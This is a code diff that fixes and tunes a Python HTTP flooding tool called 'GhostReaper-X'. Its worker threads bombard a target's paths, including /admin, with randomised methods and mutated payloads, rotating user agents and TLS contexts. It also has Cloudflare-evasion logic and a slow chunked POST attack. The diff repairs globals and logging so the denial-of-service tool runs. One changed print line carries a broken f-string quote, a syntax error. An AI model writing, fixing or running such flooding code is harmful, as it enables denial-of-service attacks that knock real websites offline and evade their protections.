@@ -64,6 +64,9 @@ def load_list(file):
 
 def load_user_agents(file):
     global user_agents
+    if not os.path.exists(file):
+        with open(file, 'w') as f:
+            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n")
     user_agents = load_list(file)
 
 def inject_headers():
@@ -240,6 +243,7 @@ def rotate_tls_context():
     return thread_local.tls_ctx
 
 def analyze_bypass(status_code, response_text):
+    global flood_method, delay
     try:
         if "cloudflare" in response_text.lower():
             flood_method = "PATCH"
@@ -333,9 +337,9 @@ def launch_ghost_sequence():
     print(f"Session Cycle : { 'Enabled' if session_cycle else 'Disabled' }")
     print(f"Delay      : {delay}s")
     print(f"Flood Method: {flood_method}")
-    print(f"Failover Monitoring : { 'Enabled' if failover_monitoring else 'Disabled' }")
+    print(f"Failover Monitoring : { 'Enabled if failover_monitoring else 'Disabled'}")
     print(f"Silent Mode : { 'Enabled' if silent_mode else 'Disabled' }")
-    print(f"Log File   : {log_file_path if log_file else 'None'}")
+    print(f"Log File   : {log_file_path if log_file_path else 'None'}")
 
     load_user_agents(ua_file)
 
@@ -345,6 +349,11 @@ def launch_ghost_sequence():
     def worker():
         local_retry = 0
         local_headers = get_thread_headers()
+
+        # 🔧 Inisialisasi TLS context kalau belum ada
+        if not hasattr(thread_local, "tls_ctx"):
+            thread_local.tls_ctx = rotate_tls_context()
+
         while not stop_event.is_set():
             try:
                 semaphore.acquire()
@@ -352,7 +361,7 @@ def launch_ghost_sequence():
                 paths = ["/", "/ping", "/admin", "/admin/login", "/?debug", "/v1/chain"]
                 chain_path = random.choice(paths)
                 payload_data = smart_mutate(mutate_payload(payload_type))
-                method = random.choice(["POST", "PUT", "PATCH", "OPTIONS", "XDEBUG", "BREACH"])
+                method = random.choice(["POST", "PUT", "PATCH", "OPTIONS"])
                 if random.random() < 0.3:
                     local_headers = get_thread_headers()
                 conn.request(method, chain_path, payload_data, local_headers)
@@ -372,7 +381,7 @@ def launch_ghost_sequence():
                     time.sleep(2.5)  # Delay burst cooldown
             except Exception as e:
                 if log_file:
-                    with open(log_file, 'a') as f:
+                    with open(log_file_path, 'a') as f:
                         f.write(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}\n")
                 else:
                     print(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}")
@@ -403,7 +412,6 @@ def launch_ghost_sequence():
     for thread in thread_pool:
         thread.join()
 
-    log_file.close()
     print("GhostReaper-X sequence terminated.")
 
 def print_status():
@@ -474,7 +482,6 @@ if __name__ == "__main__":
 
     if not log_file_path:
         log_file_path = f"/sdcard/cyberthread_log_{int(time.time())}.txt"
-    log_file = open(log_file_path, 'a')
 
     print_banner_brutal()
 
@@ -505,5 +512,3 @@ if __name__ == "__main__":
         threading.Thread(target=slow_chunked_post, args=(parsed_url.hostname,)).start()
 
     launch_ghost_sequence()
-
-    log_file.close()
